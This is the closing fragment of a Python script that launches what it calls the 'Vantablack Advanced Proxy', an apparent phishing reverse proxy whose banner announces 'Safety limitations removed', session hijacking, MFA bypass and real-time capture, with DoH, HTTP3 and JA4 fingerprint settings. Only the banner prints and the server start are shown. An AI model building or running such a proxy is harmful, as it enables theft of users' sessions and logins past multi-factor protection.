    print("🚀 Starting Vantablack Advanced Proxy - Red Team Mode Activated")
    print("🔓 Safety limitations removed - Professional attack capabilities enabled")
    print("🎯 Features: Session Hijacking, MFA Bypass, Real-time Capture")
    print(f"🎯 Reverse Proxy Target: {_proxy_config['REVERSE_PROXY_TARGET']}")
    print(f"🎯 DoH: {'ON' if _proxy_config['USE_DOH'] else 'OFF'} | HTTP3: {'ON' if _proxy_config['USE_HTTP3'] else 'OFF'}")
    print(f"🎯 JA4 Profile: {_proxy_config['JA4_PROFILE']}")

    uvicorn.run(app, host="0.0.0.0", port=8080, log_level="info")
